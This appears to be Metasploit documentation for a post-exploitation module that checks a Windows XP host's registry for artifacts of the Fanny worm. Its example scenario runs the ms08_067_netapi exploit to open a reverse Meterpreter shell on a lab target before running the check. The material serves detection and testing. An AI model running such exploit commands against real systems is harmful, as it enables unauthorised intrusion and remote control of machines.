## Vulnerable Application
Fanny or DWE for short. (DWE = DementiaWheel)

Detection module based on the `post/windows/gather/forensics/duqu_check` module. Fanny is a worm that infects windows
machines, via USB (not trough Autorun, or at least not only).

In fact, it used exploits later found in StuxNet. It creates creates some Registry artifacts.

This module is intended to detect those artifacts.

#### Supported Environments:
- Windows x86

#### Supported SessionTypes:
- Meterpreter
- Shell

#### Supported OS's:
- Windows XP Pro (SP3)

## Verification Steps

- Start msfconsole
- Open a session on a Windows host (using `exploit/windows/smb/ms08_067_netapi` for example)
- Use `post/windows/gather/forensics/fanny_bmp_check`
- Set the `SESSION` datastore option to the target session
- Run the module

## Options

## Scenarios

### Windows XP SP3
```
msf6 exploit(windows/smb/ms08_067_netapi) > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.122.1
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.122.160
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4444
msf6 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 192.168.122.1:4444 
[*] 192.168.122.160:445 - Automatically detecting the target...
[*] 192.168.122.160:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.122.160:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.122.160:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 192.168.122.160
[*] Meterpreter session 4 opened (192.168.122.1:4444 -> 192.168.122.160:1043) at 2020-12-22 16:55:02 +0100

meterpreter > run post/windows/gather/forensics/fanny_bmp_check
 
[*] Searching the registry for Fanny.bmp artifacts.
[+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\Driver found in registry.
[+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter2 found in registry.
[+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter3 found in registry.
[+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter8 found in registry.
[*] WORKSTATION1: 4 result(s) found in registry.
meterpreter >
```
